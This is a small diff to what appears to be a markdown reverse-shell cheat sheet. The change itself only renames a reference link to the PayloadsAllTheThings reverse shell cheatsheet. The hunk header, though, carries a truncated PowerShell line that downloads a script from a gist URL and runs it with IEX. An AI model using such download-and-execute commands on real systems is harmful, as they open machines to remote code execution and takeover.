@@ -80,4 +80,4 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubuse
 
 
 ## REFERENCES
-*[SwisskyRepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+*[SwisskyRepo - Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
